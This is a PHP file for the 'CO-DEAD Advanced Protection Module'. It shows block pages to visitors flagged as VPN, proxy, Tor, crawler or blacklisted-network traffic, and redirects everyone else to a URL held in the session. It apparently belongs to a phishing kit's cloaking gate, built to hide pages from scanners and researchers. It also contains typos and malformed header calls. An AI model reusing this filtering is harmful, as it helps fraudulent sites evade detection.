<?php 

/**
_________  ________             ________  ___________   _____  ________   
\_   ___ \ \_____  \            \______ \ \_   _____/  /  _  \ \______ \  
/    \  \/  /   |   \    ______  |    |  \ |    __)_  /  /_\  \ |    |  \ 
\     \____/    |    \  /_____/  |    `   \|        \/    |    \|    `   \
 \______  /\_______  /          /_______  /_______  /\____|__  /_______  /
        \/         \/                   \/        \/         \/        \/ 
		
			ICQ & Telegram = @CO_DEAD
            CO-DEAD Advanced Protection Module

            
 * DO NOT SELL THIS SCRIPT !
 * DO NOT CHANGE COPYRIGHT !
            
**/ 
session_start();
$code = $_SESSION["code"];
$tempale = file_get_contents(__DIR__."/templates/main.html");
switch ($code) {
    case "country":
        header("HTTP/1.0 Country Blocked");
        $tempale = str_replace("{text}", "Country Blocked", $tempale);
        $tempale = str_replace(
            "{error_message}",
            "Visitors from your country are not permitted to vist this ste.",
            $tempale
        );
        die($tempale);
    case "ipq":
        header("IP Reputations Is Bad");
        $tempale = str_replace("{text}", "IP Reputations Is Bad", $tempale);
        $tempale = str_replace(
            "{error_message}",
            "You dont have reputed ip to view this page.",
            $tempale
        );
        die($tempale);
    case "vpn":
        header("VPN Detetcted");
        $tempale = str_replace("{text}", "VPN Detetcted", $tempale);
        $tempale = str_replace(
            "{error_message}",
            "You dont have authorization to view this page.",
            $tempale
        );
        die($tempale);
    case "proxy":
        header("Proxy Detected");
        $tempale = str_replace("{text}", "Proxy Detected", $tempale);
        $tempale = str_replace(
            "{error_message}",
            "You dont have authorization to view this page.",
            $tempale
        );
        die($tempale);
    case "tor":
        header("TOR Detetcted");
        $tempale = str_replace("{text}", "TOR Detetcted", $tempale);
        $tempale = str_replace(
            "{error_message}",
            "You dont have authorization to view this page.",
            $tempale
        );
        die($tempale);
    case "crawler":
        header("Crawler Detetcted");
        $tempale = str_replace("{text}", "Crawler Detetced", $tempale);
        $tempale = str_replace(
            "{error_message}",
            "You dont have authorization to view this page.",
            $tempale
        );
        die($tempale);
    case "badisp":
        header("Blacklisted ISP");
        $tempale = str_replace("{text}", "You Got Blacklisted ISP", $tempale);
        $tempale = str_replace(
            "{error_message}",
            "You dont have authorization to view this page.",
            $tempale
        );
        die($tempale);
    case "badhost":
        header("Blacklisted Hostname");
        $tempale = str_replace(
            "{text}",
            "You Got Blacklisted Hostname",
            $tempale
        );
        $tempale = str_replace(
            "{error_message}",
            "You dont have authorization to view this page.",
            $tempale
        );
        die($tempale);
    case "badua":
        header("Blacklisted User Agent");
        $tempale = str_replace(
            "{text}",
            "You Got Blacklisted User Agent",
            $tempale
        );
        $tempale = str_replace(
            "{error_message}",
            "You dont have authorization to view this page.",
            $tempale
        );
        die($tempale);
    case "badasn":
        header("Blacklisted ASN");
        $tempale = str_replace("{text}", "You Got Blacklisted ASN", $tempale);
        $tempale = str_replace(
            "{error_message}",
            "You dont have authorization to view this page.",
            $tempale
        );
        die($tempale);
    case "ondb":
        header("On Batabase");
        $tempale = str_replace(
            "{text}",
            "Found This IP On Our Database",
            $tempale
        );
        $tempale = str_replace(
            "{error_message}",
            "You dont have authorization to view this page.",
            $tempale
        );
        die($tempale);
    default:
        die(header("Location: " . $code));
}